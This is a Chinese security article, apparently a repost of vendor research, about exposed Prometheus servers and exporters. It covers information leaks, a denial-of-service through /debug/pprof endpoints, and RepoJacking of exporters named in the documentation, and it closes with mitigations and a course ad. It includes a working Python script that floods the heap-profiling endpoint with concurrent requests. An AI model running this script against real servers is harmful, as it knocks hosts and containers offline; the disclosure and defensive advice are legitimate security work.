---
title: 30万台Prometheus服务器暴露在DoS攻击风险下，你的系统安全吗？
url: https://mp.weixin.qq.com/s?__biz=MzU0MzkzOTYzOQ==&mid=2247489608&idx=1&sn=fc2f55a9f4dfa3986c344ba5917506c3&chksm=fb029510cc751c06a208a061c86b918ab4181ad3716cfbbc74b52c4bf4630b85b3526658ffd2&scene=58&subscene=0#rd
source: 黑伞安全
date: 2025-02-06
fetch_date: 2025-10-06T20:36:54.605395
---

# 30万台Prometheus服务器暴露在DoS攻击风险下，你的系统安全吗？

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGpFNWquWw9oPOgBzQAg374ByG9bUERjSHSNOxddebFILia6iaUniae43oKG1QJZKDXlfWt1yf1UW1z0g/0?wx_fmt=jpeg)

# 30万台Prometheus服务器暴露在DoS攻击风险下，你的系统安全吗？

aqua

黑伞安全

在本次研究中，我们发现了Prometheus生态系统中的多个漏洞和安全缺陷。这些发现涵盖了三个主要领域：信息泄露、拒绝服务（DoS）以及代码执行。

## What is Prometheus?

Prometheus 是一个开源的监控和警报工具包，已成为现代监控策略的基石。其核心架构包括定期从目标中抓取指标、在时间序列数据库中本地存储这些数据，并提供强大的查询语言 PromQL 用于实时数据分析。该系统是模块化的，具有诸如 Alertmanager 处理警报和 Grafana 可视化等功能组件，使其非常适合像 Kubernetes 这样的动态环境。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGpFNWquWw9oPOgBzQAg374BhFHufsHJ5YAOqxWPof2gRsJMpuDgHh531MMmQIYxjC2WicQkRkOUorQ/640?wx_fmt=jpeg&from=appmsg)

**Exporters** 安装在各种系统上，用于从受监控的端点收集指标，使Prometheus能够抓取和存储以Prometheus格式本地不公开指标的系统、应用程序或服务的数据。

我们使用Shodan，一个旨在识别联网设备的搜索引擎，来分析公开可访问的Prometheus服务器和出口器的存在情况。我们的调查结果揭示了超过296,000个面向互联网的出口器和40,000个Prometheus服务器，总计约336,000台服务器面临潜在风险。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGpFNWquWw9oPOgBzQAg374BrVmh1eMxjUWQQrH2oaeKJ8EMNTfvOp4H3Rc9PpjpSsYJtarcaibOeDQ/640?wx_fmt=jpeg&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGpFNWquWw9oPOgBzQAg374B7Iu4MJ9Xvd2BEiaKNGKTDg8nfpLG73mR4XmEXhoiapDd71ypJKHsiaQuQ/640?wx_fmt=jpeg&from=appmsg)

**通过暴露的Prometheus服务器和** Metrics Endpoints **进行信息泄露**

当 Prometheus 服务器或出口商未经过身份验证而连接到公共互联网时，它们会带来重大风险。这样的错误配置允许任何人查询暴露环境以列出标签或指标。攻击者可以利用此访问权限来收集看似琐碎的数据，并在使用密钥扫描工具的帮助下发现敏感信息，包括凭据、密码、认证令牌和 API 密钥。

如图 4 所示。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGpFNWquWw9oPOgBzQAg374BCic7FBH0gKKXaqtrm11RXsicXx5X0pUKDicC5dqKDxUErCmYmWeDAHTJA/640?wx_fmt=other&from=appmsg)

**我们通过Node Exporter的暴露/metrics端点观察到了另一个信息泄露的例子。在某些情况下，这个端点可以揭示内部API端点。这种暴露可能会无意中允许攻击者扩大其攻击面、访问敏感数据，并学习和利用未打算用于公共使用的内部后端功能。此外，暴露的Prometheus服务器和/metrics端点可以揭示公司的子域、Docker注册表、图像和其他信息。例如，我们发现了一个与欧洲最大的汽车制造商之一斯柯达相关的未经身份验证的Prometheus实例。除了暴露链接到Skoda的Docker registries和images外，该Prometheus服务器还通过kube\_ingress\_path指标揭示了Skoda的子域和路径。**

**![](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGpFNWquWw9oPOgBzQAg374BkcWFmzVRnywlFYPEuUJIBZE6uDYHAuT5o3PlsVVNroFq8aHlKRiaibGA/640?wx_fmt=jpeg&from=appmsg)**

### **DoS in Prometheus: Exploiting /debug/pprof Endpoints**

在本研究中，我们对Prometheus及其关键组件进行了分析，包括prometheus/prometheus、prometheus/alertmanager、prometheus/pushgateway、prometheus/node\_exporter等。特别关注的是Go调试界面，称为pprof包，通常用于性能分析。具体来说，当导入http/pprof包（默认情况下它嵌入在大多数Prometheus组件中）时，会为性能数据提供一个HTTP服务器的/debug/pprof端点。例如，您可以访问Prometheus服务器和节点导出器的pprof端点通过http：//<<IP\_ADDRESS：9090-9100>>/debug/pprof/。

#### **Exploiting the ‘/debug/pprof’ Endpoint**

配置错误的Prometheus服务器和导出器暴露在互联网上，提供了对pprof端点的HTTP访问权限，默认情况下大多数Prometheus组件都启用了该功能。如图4所示，访问/debug/pprof端点可获得各种功能的访问权限，例如/debug/pprof/heap用于堆分析、/debug/pprof/trace用于跟踪等。

![](https://mmbiz.qpic.cn/mmbiz_jpg/ZS0VQrDMfGpFNWquWw9oPOgBzQAg374BtzqUBxMvkSBJKBI8DtXMgKlLyP2tcJYajuEiaUib8JsnzMh8Xpv5hRicQ/640?wx_fmt=other&from=appmsg)

暴露的/debug/pprof端点存在重大安全风险。虽然它旨在帮助用户分析远程主机，但攻击者可以利用它执行拒绝服务（DoS）攻击。例如，向如/debug/pprof/heap？seconds={i}这样的端点发送多个同时请求会迫使服务器进行密集的分析操作，消耗过多的CPU和内存资源。这可能会降低系统的性能，导致服务不稳定或中断，特别是如果没有适当的访问控制或资源限制的情况下。

与暴露的/debug/pprof端点相关的其他风险在以下博客中详细说明。我们创建了一个概念证明，可在下面的Gist上找到。

```
import concurrent.futuresimport requestsfrom time import time
# List of URLs to requesturls = []for i in range(10000):    urls.append(f"http://<Prometheus-URL>:9090/debug/pprof/heap?seconds={i}")

def fetch_url(url):    try:        print(url)        response = requests.get(url)        return (        url, response.status_code, response.text[:100])  # Return URL, status code, and first 100 chars of content    except requests.RequestException as e:        return (url, None, str(e))  # In case of error, return the exception

def fetch_all_urls(urls):    results = []    with concurrent.futures.ThreadPoolExecutor(max_workers=100000) as executor:        future_to_url = {executor.submit(fetch_url, url): url for url in urls}        for future in concurrent.futures.as_completed(future_to_url):            url = future_to_url[future]            try:                result = future.result()                results.append(result)            except Exception as exc:                results.append((url, None, str(exc)))    return results

if __name__ == "__main__":    start_time = time()    results = fetch_all_urls(urls)    end_time = time()
    for url, status, content in results:        print(f"URL: {url} \nStatus: {status}\nContent: {content}\n")
    print(f"Time taken: {end_time - start_time} seconds")
```

这个脚本演示了如何对暴露的/debug/pprof端点执行DoS攻击。在我们的研究中，我们测试了该脚本的各种Prometheus组件和部署，包括Node Exporter，它为Prometheus监控收集系统指标，如CPU、内存和磁盘使用情况。我们使用了一台标准虚拟机。我们针对/debug/pprof调试端点的测试分为两类：

* 主机级部署
  当Node Exporter直接安装在主机上时，攻击者可以利用DoS请求来利用/debug/pprof端点，导致主机及其服务无法访问。在云托管环境中，例如AWS EC2实例，我们的测试表明，DoS攻击会导致与主机的通信中断，需要重新启动机器才能恢复功能。
* Pod 级别部署（Kubernetes）
  当 Node Exporter 在一个 Kubernetes 容器中运行时，攻击者可以使用 /debug/pprof 终结点反复崩溃该容器。我们的测试结果表明（取决于如何配置 Kubernetes）：

+ 增加的操作开销：频繁的容器故障需要管理员持续关注。
+ 集群性能下降：Kubernetes 尝试重启失败的容器，影响其他工作负载的性能。
+ 资源耗尽：由于 OOMKilled 或驱逐而失败的容器无谓地消耗了资源。

* 先前的警告
  后来，我们发现，在Cure53对Prometheus安全团队进行的一次审计中，/debug/pprof的暴露被标记为一个安全风险，并在GitHub问题中进行了记录。其他CNCF项目也认识到了类似的危险并加以解决，例如Kubernetes，它解决了相关的漏洞，比如CVE-2019-11248。
* 与Prometheus的披露过程
  不经过身份验证就将Prometheus、其组件和各种导出程序暴露到互联网上被认为是不良做法。然而，/debug/pprof端点引入了一个特别令人担忧的风险：能够直接影响主机/容器，并充当DoS攻击的载体。我们认为，这个漏洞需要引起注意并缓解。当我们向Prometheus安全团队披露我们的调查结果时，他们的回应是：“支持良好的生产实践胜过保护用户免受严重的错误配置。”

**通过RepoJacking在Prometheus导出器中执行代码**在我们的研究过程中，我们发现几个Prometheus导出器容易受到RepoJacking的影响。这表明，在许多开源项目中，RepoJacking仍然是一种实际的风险。

GitHub RepoJacking是一种供应链攻击类型，允许攻击者接管GitHub项目的依赖关系或整个项目，在使用这些项目的任何人上运行恶意代码。当所有者删除或重命名存储库时，就会发生这种情况。如果这个存储库仍被其他内部或外部项目引用，攻击者可以创建一个具有相同旧名称（更改或删除）的新存储库，并以此方式控制所引用的名称。现在任何将使用旧名或已删除名的新用户都会从受攻击控制的存储库下载代码，从而引入恶意代码并在使用旧名的人的环境中执行它（使用指向原始项目的旧链接）。您可以在我们的博客中阅读有关此漏洞的更多信息，以及GitHub在以下文章中的缓解步骤。

就Prometheus而言，我们发现其官方文档中列出的一些导出器容易受到RepoJacking的影响。攻击者可以声称文档中提到的现已可用的用户名，重新创建同名的导出器并托管恶意版本。遵循文档的不知情用户可能会不知不觉地克隆和部署这个恶意导出器，导致远程代码在其系统上执行。以下是易受影响的导出器示例：

|  |  |
| --- | --- |
| Category | Exporter Name |
| HTTP | Nginx VTS Exporter |
| HTTP | Tinyproxy Exporter |
| FinOps | AWS Cost Exporter |
| FinOps | Azure Cost Exporter |
| FinOps | Kubernetes Cost Exporter |
| APIs | Rancher Exporter |
| APIs | Docker Hub Exporter |
| APIs | Docker Cloud Exporter |

我们可以讨论这个列表中的两个用例。以“AWS成本导出器”为例。当有人点击aws-cost-exporter链接时，GitHub会将他们重定向到帐户electrolux-oss和存储库aws-cost-exporter，即使原始链接指向不同的帐户，opensourcelxtrlux，具有相同的存储库名称。以下是这些链接的显示方式：

原始链接：https://github.com/opensourceelectrolux/aws-cost-exporter重定向至：https://github.com/electrolux-oss/aws-cost-exporter由于用户名opensourceelectrolux目前可以申请，攻击者可能会接管此用户名，并在原始地址下托管恶意出口商。如果有人点击原始链接，他们会不知不觉地将出口商重定向到攻击者的存储库中托管的出口商。

另一个出口商也可能面临风险。用户名hnlq715下的出口商链接当前会导致404（未找到）错误。尝试声称该帐户是不可能的，目前不清楚谁控制它。该帐户可能已经被占领，对用户构成潜在的风险。

我们向Prometheus安全团队报告了这一风险并提交了一个拉取请求来解决这个问题，该请求已被合并。

**那么，企业该如何应对这一安全威胁呢？**

**1. 最小化暴露面：** 尽量避免将Prometheus服务器和exporter直接暴露在互联网上。可以通过VPN、专线等方式进行访问控制，或者使用云服务商提供的安全组、防火墙等功能进行访问限制。

**2. 启用身份验证和授权：** 为Prometheus服务器和exporter配置强密码，并启用身份验证和授权机制，防止未经授权的访问。

**3. 定期更新和修补：** 及时更新Prometheus和相关组件的版本，修复已知的安全漏洞。

**4. 监控和告警：** 配置完善的监控和告警系统，及时发现和应对异常流量和攻击行为。

**5. 寻求专业安全服务：** 如果企业自身缺乏足够的安全能力，可以寻求专业的安全服务提供商进行安全评估和加固。

**安全无小事，防范于未然。** 面对日益严峻的网络安全形势，企业需要提高安全意识，采取有效的安全措施，才能保障业务系统的稳定运行和数据安全。

如果你是一个长期主义者，欢迎加入我的知识星球,我们一起冲，一起学。2025 年春节推出内部云安全课程，后续涨价 159 元。每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款。

![](https://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGpcY6gfCIxenk0q7P2HTb6zldNBBUcicPWcznpg5HxMcbvvWF5aAFj3sPJC7yYI5PUibHib7Vo9xWCicw/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

#

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

黑伞安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ZS0VQrDMfGr18k2OX2bpFFOefrkkbBpD4vsBhoQarpxbyLrL6uPXZicsFclqF0MRchuR2BqurUicZl69eOTW2wvw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过